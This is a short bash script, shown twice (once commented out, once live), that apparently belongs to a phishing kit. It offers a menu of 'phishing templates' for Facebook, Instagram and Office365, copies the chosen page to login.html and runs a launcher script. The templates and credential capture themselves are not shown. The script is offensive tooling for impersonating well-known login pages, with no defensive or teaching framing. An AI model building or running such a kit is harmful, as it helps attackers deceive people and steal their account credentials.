# #!/bin/bash

# echo "Choose a phishing template:"
# echo "[1] Facebook"
# echo "[2] Instagram"
# echo "[3] Office365"
# read -p "Select option [1-3]: " opt

# case $opt in
#   1) cp templates/facebook.html login.html && echo "[+] Facebook template selected" ;;
#   2) cp templates/instagram.html login.html && echo "[+] Instagram template selected" ;;
#   3) cp templates/office365.html login.html && echo "[+] Office365 template selected" ;;
#   *) echo "[!] Invalid option" ; exit 1 ;;
# esac

# ./lazy_start.sh

#!/bin/bash

echo "Choose a phishing template:"
echo "[1] Facebook"
echo "[2] Instagram"
echo "[3] Office365"
read -p "Select option [1-3]: " opt

case $opt in
  1) cp templates/facebook.html login.html && echo "[+] Facebook template selected" ;;
  2) cp templates/instagram.html login.html && echo "[+] Instagram template selected" ;;
  3) cp templates/office365.html login.html && echo "[+] Office365 template selected" ;;
  *) echo "[!] Invalid option" ; exit 1 ;;
esac

./lazy_start.sh
